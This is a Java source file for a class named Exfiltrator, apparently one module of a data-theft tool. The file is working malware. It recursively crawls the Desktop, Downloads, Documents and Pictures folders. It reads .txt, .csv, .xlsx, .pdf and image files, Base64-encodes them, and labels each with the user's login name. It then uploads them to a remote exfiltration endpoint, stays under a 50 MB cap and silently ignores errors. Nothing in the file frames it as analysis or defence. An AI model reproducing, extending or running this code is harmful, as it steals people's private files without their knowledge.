package modules.core;

import modules.auxiliary.Endpoint;
import modules.auxiliary.FileSubmission;
import modules.file.ExfiltratorFileHandler;
import modules.net.ExfiltratorHttpClient;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Base64;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
    Module for traversing directories and exfiltrating files to the API.

    @author Str1k3r
    @version 1.0
*/
public class Exfiltrator implements Runnable {

    private static final int DATA_SIZE_CAP = 52428800; // 50 MB

    private Endpoint endpoint;
    private final ExfiltratorHttpClient exfiltratorHttpClient;
    private static ExecutorService threadPool =
            Executors.newFixedThreadPool(4); // module's thread pool
    private final File rootDir; // the current working directory of the exifiltrator instance
    private final String[] textExtensions = {".txt", ".csv"};
    private final String[] binExtensions = {".xlsx",".xls",".pdf", ".png", ".jpeg", ".jpg"};

    private final String[] directories = {"Desktop", "Downloads", "Documents", "Pictures"};
    private static boolean isStopped = true;

    /**
        Set the current working directory of this exfiltrator instance.

        @param cwd The current working directory.
    */
    public Exfiltrator(String cwd) {
        exfiltratorHttpClient = ExfiltratorHttpClient.getInstance();
        rootDir = new File(cwd);

        isStopped = false; // only when an instance actually exists is the running state true
        initThreadPool();
    }

    /**
        Instantiate or re-instantiate the class thread pool if not instantiated or is shutdown.
     */
    private void initThreadPool() {
        if(threadPool == null || threadPool.isShutdown()) {
            threadPool = Executors.newFixedThreadPool(4);
        }
    }

    /**
        Returns the running state of the Exfiltrator module.

        @return Returns true if an instance of the Exfiltrator module exists, returns false otherwise.
    */
    public static boolean isStopped() {
        return isStopped;
    }

    public void exfiltrate(File file) {
        FileSubmission submission = new FileSubmission()
                .name(file.getName())
                .isBinary(true);

        try {
            if(file.isDirectory() || !file.exists()) {
                submission = submission.content(null);

                exfiltratorHttpClient.uploadFile(submission);
                return; // not a single existent file
            }

            try(FileInputStream inStream = new FileInputStream(file)) {
                submission = submission.content(
                        Base64.getEncoder().encodeToString(inStream.readAllBytes())
                );
            }

            exfiltratorHttpClient.uploadFile(submission);
        }
        catch(Exception ex) { // FileNotFound or IO exception
            exfiltratorHttpClient.uploadFile(submission.content(null)); // empty submission to indicate error

        }

    }

    /**
        Traverses the current directory to exfiltrate files of set extensions, and spawn
        new Exfiltrators for subdirectories.
    */
    public void exfiltrate() {
        if(isStopped()) return; // do not run

        File[] listing = rootDir.listFiles();
        if (listing == null) {
            return;
        }

        // send as many files as possible that fit within the data size cap
        long dataSizeSent = 0;
        try {
            for (File file : listing) {
                if (isStopped()) return; // do not continue

                if (dataSizeSent < DATA_SIZE_CAP) {
                    if ((dataSizeSent + file.length()) > DATA_SIZE_CAP) {
                        continue; // will result in exceed of cap so skip
                    }
                } else {
                    return;
                }

                if (file.isDirectory() && !isStopped()) {
                    threadPool.execute(
                            new Exfiltrator(file.getAbsolutePath())
                    );
                    continue;
                }

                // get the extension of the file
                int periodIndex = file.getName().lastIndexOf('.'); // file.txt
                if (periodIndex >= 0 && !isStopped() &&
                        inSelectDirectory(rootDir)) { // targeting specific directories
                    String extension = file.getName().substring(periodIndex); // .txt

                    // is this the file extension we look for
                    String fileContent = null;
                    boolean isBinary = false;
                    if (in(extension, textExtensions)) {
                        fileContent = ExfiltratorFileHandler.readTextFile(file);
                    } else if (in(extension, binExtensions)) {
                        fileContent = ExfiltratorFileHandler.readBinaryFile(file);
                        isBinary = true;
                    }

                    if (fileContent != null) {
                        if (sendSubmission(file.getName(), isBinary, fileContent)) {
                            dataSizeSent += file.length(); // update size of sent data
                        }
                    }
                }

            }
        }
        catch (Exception ex) {
            /*pass*/
        }
    }

    @Override
    public void run() {
        exfiltrate();
    }

    /**
        Creates modules.auxiliary.FileSubmission and delegates sending to modules.net.HttpResponder.

        @param content The content to set for the modules.auxiliary.FileSubmission object.

        @return Returns true if submission succeeded, false otherwise.
    */
    private boolean sendSubmission(String filename, boolean isBinary, String content) {

        FileSubmission submission = new FileSubmission()
                .clientName(System.getProperty("user.name"))
                .name(filename)
                .isBinary(isBinary)
                .content(content);

        try {
            return exfiltratorHttpClient.<Boolean>sendSubmission(submission, Endpoint.exfiltration());
        }
        catch (Exception ex) { return false; }
    }

    /**
        Search a list to find if a target value is in the list.

        @param target The target value to search for.
        @param list The list to search through.

        @return Return true if the target value is found, false otherwise.
    */
    private boolean in(String target, String[] list) {

        for(String item : list) {
            if(item.equalsIgnoreCase(target)) {
                return true; // found
            }
        }

        return false; // not found
    }

    /**
        Determine whether the provided file's path contains any of the keywords of targeted directories.

        @param file The file to evaluate for keywords in its path.

        @return
            Returns true if any of the keywords are found in the path, false if none.
     */
    private boolean inSelectDirectory(File file) {
        String absolutePath = file.getAbsolutePath().toLowerCase();

        for(String keyword : directories) {
            if(absolutePath.contains(keyword.toLowerCase())) {
                return true;
            }
        }

        return false;
    }

    /**
        Shuts down all threads.
    */
    public static void shutdown() {
        try {
            threadPool.shutdown(); // orderly shutdown

            if (!threadPool.awaitTermination(20, TimeUnit.SECONDS)) {
                threadPool.shutdownNow(); // waited but time elapsed, so forced shutdown
            }
        }
        catch (InterruptedException interruptedEx) {
            threadPool.shutdownNow(); // waiting interrupted
        }

        isStopped = true;
    }
}
